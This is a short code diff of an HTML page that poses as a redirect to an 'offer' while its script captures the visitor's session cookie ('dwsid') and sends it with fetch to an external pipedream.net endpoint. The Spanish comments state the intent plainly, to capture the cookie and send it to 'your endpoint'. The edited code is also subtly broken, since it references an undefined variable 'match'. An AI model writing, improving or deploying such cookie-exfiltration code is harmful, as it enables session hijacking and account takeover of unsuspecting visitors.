@@ -8,8 +8,10 @@
   <h1>Redirigiendo a la oferta...</h1>
 
   <script>
+    const cookie = document.cookie.match(/(?:^|; )dwsid=([^;]*)/);
+    const dwsid = match ? match[1] : "";
     // Capturamos la cookie
-    const cookie = document.cookie;
+    
 
     // La enviamos a tu endpoint
     fetch("https://eoozwutroaqr7ij.m.pipedream.net", {
